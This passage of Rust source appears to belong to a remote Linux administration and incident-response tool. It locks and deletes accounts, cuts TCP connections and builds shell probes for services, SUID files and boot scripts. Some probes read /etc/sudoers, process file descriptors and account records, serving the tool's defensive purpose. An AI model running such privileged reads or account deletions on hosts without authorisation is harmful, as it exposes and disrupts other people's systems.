            UserAccountAction::Lock | UserAccountAction::Unlock => {
                observed.as_ref().is_some_and(|snapshot| {
                    same_user_account_identity(snapshot, &self.plan.snapshot)
                        && user_account_action_verified(snapshot, self.plan.action)
                })
            }
        };
        let mut observed = self
            .service
            .user_account_snapshot(self.session, &self.plan.snapshot.username)
            .await?;
        // userdel has finished when it returns: an account still there will
        // not vanish later, and on hosts where every SSH command costs ~11 s,
        // twenty more reads would run past the execute deadline and turn a
        // clear refusal into "the target did not answer".
        let retries = if self.plan.action == UserAccountAction::Delete {
            0
        } else {
            20
        };
        for _ in 0..retries {
            if done(&observed) {
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
            observed = self
                .service
                .user_account_snapshot(self.session, &self.plan.snapshot.username)
                .await?;
        }
        let passed = done(&observed);
        if self.plan.action == UserAccountAction::Delete {
            if passed
                && self.plan.snapshot.uid == 0
                && !self.service.root_is_uid_zero(self.session).await?
            {
                return Ok(VerificationResult {
                    passed: false,
                    detail: format!(
                        "账户 {} 已删除，但回读时 root 已不是 UID 0。请立即在仍然打开的终端里检查 /etc/passwd，不要断开现有连接。",
                        self.plan.snapshot.username,
                    ),
                });
            }
            return Ok(VerificationResult {
                passed,
                detail: user_account_delete_detail(
                    &self.plan.snapshot,
                    observed.as_ref(),
                    &receipt.summary,
                ),
            });
        }
        Ok(VerificationResult {
            passed,
            detail: match observed {
                Some(snapshot) => format!(
                    "{}后回读：账户 {} 现在{}{}。",
                    self.plan.action.label(),
                    snapshot.username,
                    snapshot.password_state.display(),
                    if passed {
                        "，与预期一致"
                    } else {
                        "，与预期不符"
                    },
                ),
                None => format!(
                    "{}后回读时，账户 {} 已不存在。",
                    self.plan.action.label(),
                    self.plan.snapshot.username,
                ),
            },
        })
    }

    async fn restore(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<()> {
        self.ensure_plan(operation)?;
        if self.plan.action == UserAccountAction::Delete {
            // The plan carries no restore description, so the operation layer
            // refuses before reaching here; this is the second lock on a door
            // that has no key. The password hash was never saved.
            return Err(CoreError::validation(
                "user account restore",
                "a deleted account is not recreated automatically",
            ));
        }
        let observed = self
            .service
            .user_account_snapshot(self.session, &self.plan.snapshot.username)
            .await?
            .ok_or_else(|| CoreError::NotFound {
                entity: "user account",
                id: self.plan.snapshot.username.clone(),
            })?;
        if !same_user_account_identity(&observed, &self.plan.snapshot) {
            return Err(CoreError::validation(
                "user account restore",
                "refusing to restore because the account identity changed",
            ));
        }
        if observed.password_state == self.plan.snapshot.password_state {
            return Ok(());
        }
        if !user_account_action_verified(&observed, self.plan.action) {
            return Err(CoreError::validation(
                "user account restore",
                "refusing to overwrite an unexpected password lock state",
            ));
        }
        let restore_action = match self.plan.action {
            UserAccountAction::Lock => UserAccountAction::Unlock,
            UserAccountAction::Unlock => UserAccountAction::Lock,
            UserAccountAction::Delete => unreachable!("refused above"),
        };
        let output = self
            .service
            .ssh
            .execute_bound(
                self.session,
                user_account_command(&self.plan.snapshot.username, restore_action),
                Duration::from_secs(20),
            )
            .await?;
        if output.timed_out || output.exit_code != Some(0) {
            return Err(command_failed("user account restore", &output));
        }
        let restored = self
            .service
            .user_account_snapshot(self.session, &self.plan.snapshot.username)
            .await?
            .ok_or_else(|| CoreError::NotFound {
                entity: "user account",
                id: self.plan.snapshot.username.clone(),
            })?;
        if !same_user_account_identity(&restored, &self.plan.snapshot)
            || restored.password_state != self.plan.snapshot.password_state
        {
            return Err(CoreError::validation(
                "user account restore",
                "the original account lock state was not restored",
            ));
        }
        Ok(())
    }
}

#[derive(Debug)]
struct NetworkDisconnectExecutor<'a> {
    service: &'a SystemInfoService,
    session: &'a BoundSshSession,
    plan: &'a NetworkDisconnectPlan,
}

impl NetworkDisconnectExecutor<'_> {
    fn ensure_plan(&self, operation: &OperationPlan) -> CoreResult<()> {
        if operation.id != self.plan.operation.id || operation.target != self.plan.operation.target
        {
            return Err(CoreError::validation(
                "network disconnect operation",
                "executor is bound to a different immutable plan",
            ));
        }
        Ok(())
    }
}

#[async_trait]
impl OperationExecutor for NetworkDisconnectExecutor<'_> {
    async fn execute(&self, operation: &OperationPlan) -> CoreResult<ExecutionReceipt> {
        self.ensure_plan(operation)?;
        let observed = self
            .service
            .network_connection_snapshot(self.session, &self.plan.identity)
            .await?;
        if observed.as_ref() != Some(&self.plan.snapshot) {
            return Err(CoreError::validation(
                "network disconnect precondition",
                "the connection identity changed after confirmation was prepared",
            ));
        }
        self.service.target.validate(&self.plan.operation.target)?;
        let dispatch_summary = match self
            .service
            .ssh
            .execute_bound(
                self.session,
                network_disconnect_command(&self.plan.identity)?,
                PRECONDITION_TIMEOUT,
            )
            .await
        {
            Ok(output) if !output.timed_out && output.exit_code == Some(0) => "accepted".to_owned(),
            Ok(output) if output.timed_out => "indeterminate-timeout".to_owned(),
            Ok(output) => format!("rejected-exit-{:?}", output.exit_code),
            Err(error) => format!("indeterminate-{}", bounded_text(&error.to_string(), 256)),
        };
        Ok(ExecutionReceipt {
            summary: format!(
                "disconnect {} -> {} from snapshot {}: {dispatch_summary}",
                self.plan.snapshot.local_display,
                self.plan.snapshot.remote_display,
                network_snapshot_sha256(&self.plan.snapshot),
            ),
            restore_token: None,
        })
    }

    async fn verify(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<VerificationResult> {
        self.ensure_plan(operation)?;
        let mut observed = self
            .service
            .network_connection_snapshot(self.session, &self.plan.identity)
            .await?;
        for _ in 0..20 {
            if observed.as_ref() != Some(&self.plan.snapshot) {
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
            observed = self
                .service
                .network_connection_snapshot(self.session, &self.plan.identity)
                .await?;
        }
        let passed = observed.as_ref() != Some(&self.plan.snapshot);
        Ok(VerificationResult {
            passed,
            detail: if passed {
                format!(
                    "回读：确认时的连接 {} → {} 已经不在了。",
                    self.plan.snapshot.local_display, self.plan.snapshot.remote_display
                )
            } else {
                format!(
                    "回读：确认时的连接 {} → {} 仍然存在。",
                    self.plan.snapshot.local_display, self.plan.snapshot.remote_display
                )
            },
        })
    }

    async fn restore(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<()> {
        self.ensure_plan(operation)?;
        Err(CoreError::validation(
            "network disconnect restore",
            "terminated TCP connections cannot be restored",
        ))
    }
}

fn bounded_process_output(output: &str) -> (String, bool) {
    if output.len() <= MAX_PROCESS_INVESTIGATION_CHARS {
        return (output.to_owned(), false);
    }
    let mut end = MAX_PROCESS_INVESTIGATION_CHARS;
    while end > 0 && !output.is_char_boundary(end) {
        end -= 1;
    }
    (output[..end].to_owned(), true)
}

fn bounded_service_output(output: &str) -> (String, bool) {
    if output.len() <= MAX_SERVICE_INVESTIGATION_CHARS {
        return (output.to_owned(), false);
    }
    let mut end = MAX_SERVICE_INVESTIGATION_CHARS;
    while end > 0 && !output.is_char_boundary(end) {
        end -= 1;
    }
    (output[..end].to_owned(), true)
}

fn service_investigation_command(unit: &str, action: ServiceInvestigationAction) -> String {
    let unit = shq(unit);
    let probe = match action {
        ServiceInvestigationAction::Status => "systemctl status --no-pager -l -- \"$n\"",
        ServiceInvestigationAction::Configuration => "systemctl cat --no-pager -- \"$n\"",
        ServiceInvestigationAction::Details => "systemctl show --no-pager -- \"$n\"",
        ServiceInvestigationAction::Logs => {
            "journalctl -u \"$n\" -n 100 --no-pager --output=short-iso"
        }
        ServiceInvestigationAction::ErrorLogs => {
            "journalctl -u \"$n\" -p err -n 50 --no-pager --output=short-iso"
        }
        ServiceInvestigationAction::LiveLogs => {
            "if command -v timeout >/dev/null 2>&1; then timeout -s INT 8 journalctl -u \"$n\" -n 20 -f --no-pager --output=short-iso; code=$?; [ \"$code\" -eq 0 ] || [ \"$code\" -eq 124 ] || [ \"$code\" -eq 130 ]; else journalctl -u \"$n\" -n 100 --no-pager --output=short-iso; fi"
        }
        ServiceInvestigationAction::Dependencies => {
            "systemctl list-dependencies --no-pager --all -- \"$n\""
        }
        ServiceInvestigationAction::ReverseDependencies => {
            "systemctl list-dependencies --no-pager --all --reverse -- \"$n\""
        }
        ServiceInvestigationAction::ServiceTree => {
            "printf 'Dependencies\\n'; systemctl list-dependencies --no-pager --all -- \"$n\"; printf '\\nReverse dependencies\\n'; systemctl list-dependencies --no-pager --all --reverse -- \"$n\""
        }
        ServiceInvestigationAction::CpuUsage => {
            "systemctl show --no-pager --property=CPUAccounting,CPUUsageNSec,CPUQuotaPerSecUSec,CPUWeight,TasksCurrent,TasksMax -- \"$n\""
        }
        ServiceInvestigationAction::MemoryUsage => {
            "systemctl show --no-pager --property=MemoryAccounting,MemoryCurrent,MemoryPeak,MemoryLimit,MemoryMax,MemoryHigh,MemorySwapCurrent -- \"$n\""
        }
        ServiceInvestigationAction::ProcessList => {
            "cg=$(systemctl show --property=ControlGroup -- \"$n\" 2>/dev/null | sed -n 's/^ControlGroup=//p'); if [ -n \"$cg\" ] && command -v systemd-cgls >/dev/null 2>&1; then systemd-cgls --no-pager \"$cg\"; else pid=$(systemctl show --property=MainPID -- \"$n\" 2>/dev/null | sed -n 's/^MainPID=//p'); case \"$pid\" in ''|*[!0-9]*|0) printf 'No running process\\n';; *) ps -o pid=,ppid=,user=,stat=,pcpu=,pmem=,args= -p \"$pid\" --ppid \"$pid\" 2>/dev/null;; esac; fi"
        }
        ServiceInvestigationAction::OpenFiles => {
            "pid=$(systemctl show --property=MainPID -- \"$n\" 2>/dev/null | sed -n 's/^MainPID=//p'); case \"$pid\" in ''|*[!0-9]*|0) printf 'No running process\\n';; *) if command -v lsof >/dev/null 2>&1; then lsof -nP -p \"$pid\" 2>/dev/null | head -n 200; else find \"/proc/$pid/fd\" -mindepth 1 -maxdepth 1 2>/dev/null | sed 's|.*/||' | sort -n | head -n 100 | while read -r fd; do printf '%s\\t' \"$fd\"; readlink \"/proc/$pid/fd/$fd\" 2>/dev/null; done; fi;; esac"
        }
        ServiceInvestigationAction::RunUser => {
            "systemctl show --no-pager --property=User,Group,DynamicUser,SupplementaryGroups,PAMName -- \"$n\""
        }
        ServiceInvestigationAction::Permissions => {
            "systemctl show --no-pager --property=User,Group,SupplementaryGroups,UMask,CapabilityBoundingSet,AmbientCapabilities,NoNewPrivileges,PermissionsStartOnly -- \"$n\""
        }
        ServiceInvestigationAction::SecurityCheck => {
            "systemctl show --no-pager --property=NoNewPrivileges,PrivateTmp,PrivateDevices,PrivateNetwork,ProtectSystem,ProtectHome,ProtectKernelTunables,ProtectKernelModules,ProtectControlGroups,RestrictAddressFamilies,RestrictNamespaces,LockPersonality,MemoryDenyWriteExecute,CapabilityBoundingSet,AmbientCapabilities,SystemCallFilter -- \"$n\""
        }
        ServiceInvestigationAction::ServiceFile => {
            "p=$(systemctl show --property=FragmentPath -- \"$n\" 2>/dev/null | sed -n 's/^FragmentPath=//p'); case \"$p\" in /*) printf 'Path\\t%s\\n' \"$p\"; stat -c 'Mode\\t%A (%a)%nOwner\\t%U (%u)%nGroup\\t%G (%g)%nModified\\t%y' -- \"$p\" 2>/dev/null; printf '\\nContent\\n'; sed -n '1,400p' -- \"$p\";; *) printf 'No absolute fragment path\\n';; esac"
        }
        ServiceInvestigationAction::Timers => {
            "systemctl show --no-pager --property=Triggers,TriggeredBy -- \"$n\"; printf '\\nMatching timers\\n'; systemctl list-timers --all --no-pager 2>/dev/null | grep -F -- \"$n\" || true"
        }
        ServiceInvestigationAction::Environment => {
            "systemctl show --no-pager --property=Environment,EnvironmentFiles,PassEnvironment,UnsetEnvironment -- \"$n\""
        }
    };
    format!("n={unit}; {probe}")
}

fn service_snapshot_command(unit: &str) -> String {
    let unit = shq(unit);
    format!(
        "n={unit}; systemctl show --no-pager --property=LoadState,ActiveState,SubState,UnitFileState,MainPID,FragmentPath,CanReload -- \"$n\""
    )
}

/// Reads everything that has to still be true before a SUID file is touched.
///
/// The fields are separated by spaces, not tabs, and that is the whole point:
/// `stat -c` does **not** interpret backslash escapes — only `--printf` does,
/// which busybox has never heard of — so a `\t` in the format string arrives at
/// the parser as a literal backslash and a literal `t`. This asked for tabs for
/// a long time, got one unsplittable field back from every real machine, and
/// so 移除 SUID/SGID 位 and 权限隔离（000） could not run anywhere; the
/// in-memory tests passed because the double answered with real tabs.
///
/// None of these seven values can contain a space, so single spaces separate
/// them unambiguously on GNU and busybox alike.
fn suid_snapshot_command(path: &RemotePath) -> String {
    let path = shq(path.as_str());
    format!(
        "p={path}; [ -f \"$p\" ] && [ ! -L \"$p\" ] || exit 44; sha=$(sha256sum -- \"$p\" 2>/dev/null | awk '{{print $1}}') || exit 45; stat -Lc \"$sha %a %u %g %s %d %i\" -- \"$p\""
    )
}

/// Reads the one line of the answer that is the snapshot.
///
/// Not the whole output: a shell that prints something on startup — a broken
/// `.bashrc`, a login banner, a `command not found` from a line somebody added
/// to `/etc/profile` — has its noise captured alongside the answer, and that
/// used to make every field count wrong and the action refuse. On a machine
/// somebody has been living in, a noisy shell startup is the normal case, not
/// the strange one, and refusing to disarm a setuid backdoor because the
/// intruder's own `.bashrc` line printed an error is exactly backwards.
///
/// The shape is specific enough to pick out: seven space-separated fields whose
/// first is a 64-character hex digest. The last such line is the answer, since
/// startup noise comes before the command runs.
fn parse_suid_snapshot(path: &RemotePath, output: &str) -> CoreResult<SuidFileSnapshot> {
    let snapshot_line = output.lines().rev().find(|line| {
        let fields = line.split_whitespace().collect::<Vec<_>>();
        fields.len() == 7 && is_sha256_text(fields[0])
    });
    let fields = snapshot_line
        .unwrap_or_default()
        .split_whitespace()
        .collect::<Vec<_>>();
    if fields.len() != 7 || !is_sha256_text(fields[0]) {
        // The excerpt goes in the message because this refusal is otherwise
        // unfixable from the outside: every machine that answers differently —
        // an empty answer, a shell banner in front of it, a `stat` that spells
        // its fields another way — produces the same sentence, and whoever has
        // to work out which one they are looking at has nothing to go on. It
        // reaches the log, never the window: the boundary replaces this whole
        // error with a fixed sentence of its own.
        return Err(CoreError::validation(
            "SUID file snapshot",
            format!(
                "remote output did not contain the exact snapshot schema (saw {} field(s): {})",
                fields.len(),
                bounded_text(
                    &output
                        .chars()
                        .map(|character| {
                            if character.is_control() {
                                ' '
                            } else {
                                character
                            }
                        })
                        .collect::<String>(),
                    200
                )
            ),
        ));
    }
    let parse_u32 = |value: &str, subject: &'static str| {
        value
            .parse::<u32>()
            .map_err(|_| CoreError::validation("SUID file snapshot", format!("invalid {subject}")))
    };
    let parse_u64 = |value: &str, subject: &'static str| {
        value
            .parse::<u64>()
            .map_err(|_| CoreError::validation("SUID file snapshot", format!("invalid {subject}")))
    };
    let mode = validated_octal_mode(fields[1])?;
    Ok(SuidFileSnapshot {
        path: path.clone(),
        sha256: fields[0].to_owned(),
        mode,
        uid: parse_u32(fields[2], "UID")?,
        gid: parse_u32(fields[3], "GID")?,
        size: parse_u64(fields[4], "size")?,
        device: parse_u64(fields[5], "device")?,
        inode: parse_u64(fields[6], "inode")?,
    })
}

fn is_sha256_text(value: &str) -> bool {
    value.len() == 64
        && value
            .bytes()
            .all(|byte| byte.is_ascii_digit() || (b'a'..=b'f').contains(&byte))
}

fn parse_service_snapshot(unit: &str, output: &str) -> CoreResult<ServiceStateSnapshot> {
    if !is_valid_unit_name(unit) {
        return Err(invalid_detail_key("systemd unit name"));
    }
    let values: BTreeMap<_, _> = output
        .lines()
        .filter_map(|line| line.split_once('='))
        .collect();
    let required_state = |key: &'static str| -> CoreResult<String> {
        values
            .get(key)
            .copied()
            .filter(|value| is_valid_service_state(value, false))
            .map(ToOwned::to_owned)
            .ok_or_else(|| invalid_detail_key(key))
    };
    let optional_state = |key: &'static str| -> CoreResult<String> {
        values
            .get(key)
            .copied()
            .filter(|value| is_valid_service_state(value, true))
            .map(ToOwned::to_owned)
            .ok_or_else(|| invalid_detail_key(key))
    };
    let load_state = required_state("LoadState")?;
    if load_state == "not-found" {
        return Err(CoreError::NotFound {
            entity: "systemd unit",
            id: unit.to_owned(),
        });
    }
    let main_pid = values
        .get("MainPID")
        .copied()
        .filter(|value| !value.is_empty() && value.bytes().all(|byte| byte.is_ascii_digit()))
        .ok_or_else(|| invalid_detail_key("MainPID"))?
        .parse()
        .map_err(|_| invalid_detail_key("MainPID"))?;
    let fragment_path = values
        .get("FragmentPath")
        .copied()
        .filter(|value| {
            value.is_empty()
                || (value.starts_with('/')
                    && value.len() <= MAX_CELL_CHARS
                    && !value.chars().any(char::is_control))
        })
        .ok_or_else(|| invalid_detail_key("FragmentPath"))?
        .to_owned();
    let can_reload = match values.get("CanReload").copied() {
        Some("yes") => true,
        Some("no") => false,
        _ => return Err(invalid_detail_key("CanReload")),
    };
    Ok(ServiceStateSnapshot {
        unit: unit.to_owned(),
        load_state,
        active_state: required_state("ActiveState")?,
        sub_state: required_state("SubState")?,
        unit_file_state: optional_state("UnitFileState")?,
        main_pid,
        fragment_path,
        can_reload,
    })
}

fn is_valid_service_state(value: &str, allow_empty: bool) -> bool {
    (allow_empty || !value.is_empty())
        && value.len() <= 64
        && value.bytes().all(|byte| {
            byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-' | b'.' | b'@' | b':')
        })
}

fn validate_service_runtime_precondition(
    snapshot: &ServiceStateSnapshot,
    action: ServiceRuntimeAction,
) -> CoreResult<()> {
    if snapshot.load_state != "loaded" {
        return Err(CoreError::validation(
            "service runtime precondition",
            format!("{} is not a loaded systemd unit", snapshot.unit),
        ));
    }
    let valid = match action {
        ServiceRuntimeAction::Start => snapshot.active_state != "active",
        ServiceRuntimeAction::Stop
        | ServiceRuntimeAction::Restart
        | ServiceRuntimeAction::Reload => snapshot.active_state == "active",
        ServiceRuntimeAction::Enable => snapshot.unit_file_state == "disabled",
        ServiceRuntimeAction::Disable => snapshot.unit_file_state == "enabled",
        ServiceRuntimeAction::Mask => matches!(
            snapshot.unit_file_state.as_str(),
            "disabled" | "static" | "indirect"
        ),
    };
    if !valid {
        return Err(CoreError::validation(
            "service runtime precondition",
            format!(
                "{} cannot {} from {} / {} / {}",
                snapshot.unit,
                action.command(),
                snapshot.active_state,
                snapshot.sub_state,
                snapshot.unit_file_state,
            ),
        ));
    }
    if action == ServiceRuntimeAction::Reload && !snapshot.can_reload {
        return Err(CoreError::validation(
            "service runtime precondition",
            format!("{} does not advertise reload support", snapshot.unit),
        ));
    }
    Ok(())
}

fn service_runtime_verified(snapshot: &ServiceStateSnapshot, action: ServiceRuntimeAction) -> bool {
    match action {
        ServiceRuntimeAction::Start
        | ServiceRuntimeAction::Restart
        | ServiceRuntimeAction::Reload => snapshot.active_state == "active",
        ServiceRuntimeAction::Stop => snapshot.active_state != "active",
        ServiceRuntimeAction::Enable => snapshot.unit_file_state == "enabled",
        ServiceRuntimeAction::Disable => snapshot.unit_file_state == "disabled",
        ServiceRuntimeAction::Mask => snapshot.unit_file_state == "masked",
    }
}

fn service_snapshot_sha256(snapshot: &ServiceStateSnapshot) -> String {
    let mut digest = Sha256::new();
    for value in [
        snapshot.unit.as_str(),
        snapshot.load_state.as_str(),
        snapshot.active_state.as_str(),
        snapshot.sub_state.as_str(),
        snapshot.unit_file_state.as_str(),
        snapshot.fragment_path.as_str(),
    ] {
        digest.update((value.len() as u64).to_be_bytes());
        digest.update(value.as_bytes());
    }
    digest.update(snapshot.main_pid.to_be_bytes());
    digest.update([u8::from(snapshot.can_reload)]);
    format!("{:x}", digest.finalize())
}

/// What the boot directories and the script itself say, in one round trip.
///
/// The manager is detected rather than assumed: OpenRC is recognised by its
/// runlevel directories being there as well as its tool, because a host can
/// have the tool installed and not use it.
fn boot_script_state_command(name: &str, path: &str) -> String {
    format!(
        "n={}; p={}; if [ ! -f \"$p\" ]; then printf 'ABSENT\\n'; exit 0; fi; if [ -d /etc/runlevels ] && command -v rc-update >/dev/null 2>&1; then mgr=rc-update; elif command -v update-rc.d >/dev/null 2>&1; then mgr=update-rc.d; elif command -v chkconfig >/dev/null 2>&1; then mgr=chkconfig; else mgr=none; fi; sha=$(sha256sum -- \"$p\" 2>/dev/null | awk '{{print $1}}'); starts=''; others=''; for d in /etc/rc?.d /etc/rc.d/rc?.d; do [ -d \"$d\" ] || continue; for l in \"$d\"/*; do [ -e \"$l\" ] || continue; case \"${{l##*/}}\" in S[0-9][0-9]\"$n\") starts=\"$starts $l\";; K[0-9][0-9]\"$n\") others=\"$others $l\";; esac; done; done; for l in /etc/runlevels/*/\"$n\"; do [ -e \"$l\" ] || continue; starts=\"$starts $l\"; done; printf '%s\\t%s\\t%s\\t%s\\t%s\\n' \"$n\" \"$mgr\" \"$sha\" \"${{starts# }}\" \"${{others# }}\"",
        shq(name),
        shq(path)
    )
}

/// At most this many boot links are carried in one snapshot.
///
/// A script is linked from a handful of runlevels. A list longer than this is
/// not a boot arrangement anyone made on purpose, and is refused rather than
/// carried into a plan.
const MAX_BOOT_LINKS: usize = 64;

fn parse_boot_script_state(output: &str, path: &str) -> CoreResult<BootScriptStateSnapshot> {
    let line = output.lines().next().unwrap_or_default();
    let mut fields = line.splitn(5, '\t');
    let name = fields
        .next()
        .filter(|value| is_valid_init_script_name(value))
        .ok_or_else(|| invalid_detail_key("boot script name"))?;
    let manager = match fields
        .next()
        .ok_or_else(|| invalid_detail_key("boot script manager"))?
    {
        "none" => None,
        value => Some(
            BootScriptManager::parse(value)
                .ok_or_else(|| invalid_detail_key("boot script manager"))?,
        ),
    };
    let script_sha256 = fields
        .next()
        .filter(|value| {
            value.is_empty()
                || (value.len() == 64 && value.bytes().all(|byte| byte.is_ascii_hexdigit()))
        })
        .ok_or_else(|| invalid_detail_key("boot script digest"))?;
    let links = |value: &str| -> CoreResult<Vec<String>> {
        let parsed: Vec<String> = value
            .split_whitespace()
            .map(str::to_owned)
            .collect::<Vec<_>>();
        if parsed.len() > MAX_BOOT_LINKS
            || parsed
                .iter()
                .any(|link| !link.starts_with('/') || link.len() > MAX_CELL_CHARS)
        {
            return Err(invalid_detail_key("boot link path"));
        }
        Ok(parsed)
    };
    Ok(BootScriptStateSnapshot {
        name: name.to_owned(),
        path: path.to_owned(),
        manager,
        start_links: links(fields.next().unwrap_or_default())?,
        other_links: links(fields.next().unwrap_or_default())?,
        script_sha256: script_sha256.to_owned(),
    })
}

fn boot_script_snapshot_sha256(snapshot: &BootScriptStateSnapshot) -> String {
    let mut digest = Sha256::new();
    let mut absorb = |value: &str| {
        digest.update((value.len() as u64).to_be_bytes());
        digest.update(value.as_bytes());
    };
    absorb(&snapshot.name);
    absorb(&snapshot.path);
    absorb(snapshot.manager.map_or("none", BootScriptManager::name));
    absorb(&snapshot.script_sha256);
    for link in snapshot.start_links.iter().chain(&snapshot.other_links) {
        absorb(link);
    }
    format!("{:x}", digest.finalize())
}

fn validate_boot_script_precondition(
    snapshot: &BootScriptStateSnapshot,
    action: ServiceRuntimeAction,
) -> CoreResult<()> {
    if snapshot.manager.is_none() {
        return Err(CoreError::validation(
            "boot script precondition",
            "this host has none of rc-update, update-rc.d or chkconfig",
        ));
    }
    let valid = match action {
        ServiceRuntimeAction::Enable => !snapshot.enabled(),
        ServiceRuntimeAction::Disable => snapshot.enabled(),
        _ => false,
    };
    if valid {
        return Ok(());
    }
    Err(CoreError::validation(
        "boot script precondition",
        format!(
            "{} cannot {} while it is {}",
            snapshot.name,
            action.command(),
            if snapshot.enabled() {
                "already in the boot sequence"
            } else {
                "already out of the boot sequence"
            }
        ),
    ))
}

fn boot_script_runtime_verified(
    snapshot: &BootScriptStateSnapshot,
    action: ServiceRuntimeAction,
) -> bool {
    match action {
        ServiceRuntimeAction::Enable => snapshot.enabled(),
        ServiceRuntimeAction::Disable => !snapshot.enabled(),
        _ => false,
    }
}

fn bounded_user_output(output: &str) -> (String, bool) {
    bounded_investigation_output(output, MAX_USER_INVESTIGATION_CHARS)
}

fn bounded_login_output(output: &str) -> (String, bool) {
    bounded_investigation_output(output, MAX_LOGIN_INVESTIGATION_CHARS)
}

fn bounded_artifact_output(output: &str) -> (String, bool) {
    bounded_investigation_output(output, MAX_ARTIFACT_INVESTIGATION_CHARS)
}

fn bounded_investigation_output(output: &str, maximum_bytes: usize) -> (String, bool) {
    if output.len() <= maximum_bytes {
        return (output.to_owned(), false);
    }
    let mut end = maximum_bytes;
    while end > 0 && !output.is_char_boundary(end) {
        end -= 1;
    }
    (output[..end].to_owned(), true)
}

fn user_identity_from_table(table: &SystemInfoTable, row_id: &str) -> CoreResult<UserIdentity> {
    if table.tab != SystemInfoTab::Users {
        return Err(CoreError::validation(
            "user investigation",
            "the selected row is not from the user inventory",
        ));
    }
    let row = table
        .rows
        .iter()
        .find(|row| row.id == row_id)
        .ok_or_else(|| CoreError::NotFound {
            entity: "system information row",
            id: bounded_text(row_id, 256),
        })?;
    let cell = |index: usize, subject: &'static str| -> CoreResult<&str> {
        row.cells
            .get(index)
            .map(String::as_str)
            .ok_or_else(|| invalid_detail_key(subject))
    };
    let username = cell(0, "Linux username")?;
    if !is_valid_username(username) {
        return Err(invalid_detail_key("Linux username"));
    }
    let parse_id = |value: &str, subject: &'static str| -> CoreResult<u32> {
        value
            .parse::<u32>()
            .map_err(|_| invalid_detail_key(subject))
    };
    let home = validated_absolute_path(cell(3, "user home directory")?)?;
    let shell = cell(4, "user shell")?;
    let shell = if shell.is_empty() {
        String::new()
    } else {
        validated_absolute_path(shell)?
    };
    Ok(UserIdentity {
        row_id: row.id.clone(),
        username: username.to_owned(),
        uid: parse_id(cell(1, "user UID")?, "user UID")?,
        gid: parse_id(cell(2, "user GID")?, "user GID")?,
        home,
        shell,
    })
}

fn login_identity_from_table(table: &SystemInfoTable, row_id: &str) -> CoreResult<LoginIdentity> {
    if table.tab != SystemInfoTab::LoginHistory {
        return Err(CoreError::validation(
            "login-history investigation",
            "the selected row is not from the login-history inventory",
        ));
    }
    let row = table
        .rows
        .iter()
        .find(|row| row.id == row_id)
        .ok_or_else(|| CoreError::NotFound {
            entity: "system information row",
            id: bounded_text(row_id, 256),
        })?;
    let cell = |index: usize, subject: &'static str| -> CoreResult<&str> {
        row.cells
            .get(index)
            .map(String::as_str)
            .ok_or_else(|| invalid_detail_key(subject))
    };
    let username = cell(0, "login username")?;
    if !is_valid_username(username) {
        return Err(invalid_detail_key("login username"));
    }
    let source_text = cell(2, "login source IP")?.trim();
    let source = if source_text.is_empty() || source_text == "-" {
        None
    } else {
        let source = source_text
            .parse::<IpAddr>()
            .map_err(|_| invalid_detail_key("login source IP"))?;
        (!source.is_unspecified()).then_some(source)
    };
    Ok(LoginIdentity {
        row_id: row.id.clone(),
        username: username.to_owned(),
        terminal: validated_plain_field(cell(1, "login terminal")?, 256, true)?,
        source,
        login_time: validated_plain_field(cell(3, "login time")?, 512, true)?,
        status: validated_plain_field(cell(4, "login status")?, 128, true)?,
    })
}

fn validated_plain_field(
    value: &str,
    maximum_chars: usize,
    allow_empty: bool,
) -> CoreResult<String> {
    if (!allow_empty && value.is_empty())
        || value.chars().count() > maximum_chars
        || value.chars().any(char::is_control)
    {
        return Err(invalid_detail_key("plain text field"));
    }
    Ok(value.to_owned())
}

fn user_investigation_command(username: &str, action: UserInvestigationAction) -> String {
    let username = shq(username);
    let home = "h=$(getent passwd \"$u\" 2>/dev/null | cut -d: -f6); case \"$h\" in /*) ;; *) printf 'No valid absolute home directory\\n'; exit 45;; esac;";
    let probe = match action {
        UserInvestigationAction::Details => {
            "printf 'Identity\\n'; id \"$u\" 2>/dev/null; printf '\\nAccount\\n'; getent passwd \"$u\" 2>/dev/null; printf '\\nPassword policy\\n'; chage -l \"$u\" 2>/dev/null || printf 'Password policy is unavailable\\n'".to_owned()
        }
        UserInvestigationAction::Groups | UserInvestigationAction::GroupMembership => {
            "printf 'Groups\\n'; id -nG \"$u\" 2>/dev/null; printf '\\nDetailed identity\\n'; id \"$u\" 2>/dev/null".to_owned()
        }
        UserInvestigationAction::HomeDirectory => format!(
            "{home} printf 'Home\\t%s\\n' \"$h\"; stat -c 'Mode\\t%A (%a)%nOwner\\t%U (%u)%nGroup\\t%G (%g)%nModified\\t%y' -- \"$h\" 2>/dev/null || true; printf 'Disk usage\\t%s\\n' \"$(du -sh -- \"$h\" 2>/dev/null | cut -f1 || printf 'unavailable\\n')\" "
        ),
        UserInvestigationAction::PasswordExpiry => {
            "chage -l \"$u\" 2>/dev/null || printf 'Password expiry information is unavailable\\n'".to_owned()
        }
        UserInvestigationAction::AccountStatus => {
            "printf 'Password status\\n'; passwd -S \"$u\" 2>/dev/null || printf 'Password status is unavailable\\n'; printf '\\nLast login\\n'; lastlog -u \"$u\" 2>/dev/null || true".to_owned()
        }
        UserInvestigationAction::SudoPermissions => {
            "printf 'Effective sudo permissions\\n'; sudo -nl -U \"$u\" 2>/dev/null || printf 'No non-interactive sudo result\\n'; printf '\\nMatching sudoers lines\\n'; for f in /etc/sudoers /etc/sudoers.d/*; do [ -f \"$f\" ] || continue; awk -v u=\"$u\" 'NF && $1 !~ /^#/ && index($0,u) {print FILENAME \":\" NR \":\" $0}' \"$f\" 2>/dev/null; done | head -n 100".to_owned()
        }
        UserInvestigationAction::SshKeys => format!(
